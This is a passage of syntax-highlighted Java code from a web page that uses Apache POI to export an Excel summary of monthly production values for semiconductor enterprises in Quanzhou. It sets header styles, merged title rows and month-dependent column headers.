punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 关闭Workbook和输出流</span>        workbook<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 设置表头样式     *     * @Author: CZM     * @Param: [cell, workbook]     */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setCellStyle</span><span class="token punctuation">(</span>SXSSFCell cell<span class="token punctuation">,</span> SXSSFWorkbook workbook<span class="token punctuation">)</span> <span class="token punctuation">{</span>        CellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 填充色</span>        style<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>GREY_40_PERCENT<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 字体</span>        Font font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 颜色</span>        font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>WHITE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 加粗</span>        font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//字体为宋体</span>        font<span class="token punctuation">.</span><span class="token function">setFontName</span><span class="token punctuation">(</span><span class="token string">"宋体"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置样式对齐方式：水平垂直居中</span>        style<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>        style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 产值汇总表     *     * @Author: CZM     * @Param: [list, response]     */</span>    <span class="token annotation punctuation">@SneakyThrows</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">exportExcelV2</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>EntProductionValueStatisticsV2<span class="token operator">></span> list<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//获取当前第几个月</span>        LocalDate currentDate <span class="token operator">=</span> LocalDate<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> currentMonth <span class="token operator">=</span> currentDate<span class="token punctuation">.</span><span class="token function">getMonthValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SXSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SXSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SXSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"企业产值汇总"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer startRow <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//处理Excel表头</span>        <span class="token comment" spellcheck="true">/*第一行标题,202*年泉州市规上半导体企业产值情况*/</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>startRow <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//1到currentMonth+5列合并</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> currentMonth <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>startRow<span class="token punctuation">)</span><span class="token punctuation">;</span>            SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>currentDate<span class="token punctuation">.</span><span class="token function">getYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"年泉州市规上半导体企业产值情况"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            CellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体</span>            Font font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 颜色</span>            font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//字体大小</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 加粗</span>            font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//字体为宋体</span>            font<span class="token punctuation">.</span><span class="token function">setFontName</span><span class="token punctuation">(</span><span class="token string">"宋体"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置样式对齐方式：水平垂直居中</span>            style<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            startRow<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/*第二行，单位：亿元*/</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>startRow <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> currentMonth <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            SXSSFCell cell1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cell1<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"单位：亿元"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            CellStyle style1 <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cell1<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体</span>            Font font1 <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 颜色</span>            font1<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//字体大小</span>            font1<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 加粗</span>            font1<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//字体为宋体</span>            font1<span class="token punctuation">.</span><span class="token function">setFontName</span><span class="token punctuation">(</span><span class="token string">"宋体"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style1<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>RIGHT<span class="token punctuation">)</span><span class="token punctuation">;</span>            style1<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span>            style1<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font1<span class="token punctuation">)</span><span class="token punctuation">;</span>            startRow<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//动态合并行列</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>startRow <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>currentMonth <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> currentMonth <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setCellStyle</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//列宽</span>                    sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">4500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"区域"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"企业名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"总投资"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"1月份产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>currentDate<span class="token punctuation">.</span><span class="token function">getYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token string">"年1月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"同比增速"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"备注"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                startRow <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> currentMonth <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sheet<span class="token punctuation">.</span><span class="token function">addMergedRegion</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CellRangeAddress</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> currentMonth <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setCellStyle</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//列宽</span>                    sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"区域"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"企业名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"总投资"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"1月-"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>currentMonth <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token punctuation">(</span>currentDate<span class="token punctuation">.</span><span class="token function">getYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"年1月-"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>currentMonth <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"同比增速"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"1月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"2月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"3月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"4月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"5月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"6月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"7月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"8月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"9月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"10月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"11月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"12月产值"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>currentMonth <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setCellStyle</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//列宽</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>currentMonth <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"备注"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                startRow <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//存入数据</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>startRow <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                EntProductionValueStatisticsV2 vo <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                SXSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>startRow<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> currentMonth <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    SXSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//水平垂直居中</span>                    CellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>                    style<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>CENTER<span class="token 